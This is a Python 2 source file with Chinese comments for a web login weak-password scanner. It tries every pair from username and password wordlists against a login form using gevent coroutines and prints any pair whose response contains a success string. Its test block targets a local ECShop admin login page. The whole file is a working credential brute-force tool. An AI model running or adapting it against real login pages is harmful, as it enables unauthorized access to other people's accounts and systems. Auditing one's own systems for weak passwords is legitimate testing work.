#-*- coding:utf-8 -*-
#web程序的弱密码扫描

#待完成
#cookie方式登录
import gevent
import urllib2
import gevent.monkey
gevent.monkey.patch_socket()

class  WeakPass(object):

	name = "WeakPass"
	dependencies = []
	#一般是post方法,payloads的格式为user=_&password=_
	#uparam参数占位符，pparam密码参数占位符
	uparam = "_username"
	pparam = "_password"
	#先不用考虑cookie
	def __init__(self,url,userfile,passfile,query="",data="",cookie="",extras="",proto="",head=""):
		self.url = url
		self.query = query
		self.data = data
		self.cookie = cookie
		self.extras = ""
		self.userfile = userfile
		self.passfile = passfile
		self.proto = proto
		self.head = head
		self.result = [];
	#从文件中读取信息放入数组中
	def __readfile(self,filename):
		arr = []
		with open(filename) as f:
			for a in f:
				arr.append(a.strip()) 
		return arr;
	#exploit 创建协程
	def exploit(self):
		threads =  []
		# resp = self.fetch(self.userfile,self.passfile)
		u = self.__readfile(self.userfile)
		p = self.__readfile(self.passfile)
		for i in range(0,len(u)):
			for j in range(0,len(p)):
				threads.append(gevent.spawn(self.__verify,u[i],p[j]))  
		gevent.joinall(threads)
	#验证方式，针对每一个用户名密码判断
	def __verify(self,username,password):
		response = self.__fetch(username,password)
		if self.proto in response:
			print "[*]found username,password ",username,password
	def __fetch(self,username,password):
		req = urllib2.Request(self.url)  
		# response = urllib2.urlopen('http://localhost/ecshop/admin/privilege.php?act=login')
		# data = urllib.urlencode(self.data) 
		opener = urllib2.build_opener(urllib2.HTTPCookieProcessor()) 
		data = self.data
		data = data.replace("_username",username)
		data = data.replace("_password",password)
		response = opener.open(req, data)
		# print response.getCode()  
		return response.read()
#测试ecshop
if __name__ == '__main__':
	url = "http://localhost/ecshop/admin/privilege.php"
	data = "username=_username&password=_password&act=signin"
	proto = "http://api.ecshop.com/record.php"
	#主要是参数的注入
	weakPass = WeakPass(url = url,userfile="usr.txt",passfile="pwd.txt",data = data,proto = proto)
	weakPass.exploit()
	# s = u'上平'  
	# print s
	# gevent.sleep(3);
	
	# def post(url, data):  
	# 	req = urllib2.Request(url)  
	# 	data = urllib.urlencode(data)  
	#     #enable cookie  
	# 	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())  
	# 	response = opener.open(req, data)  
	# 	return response.read()  	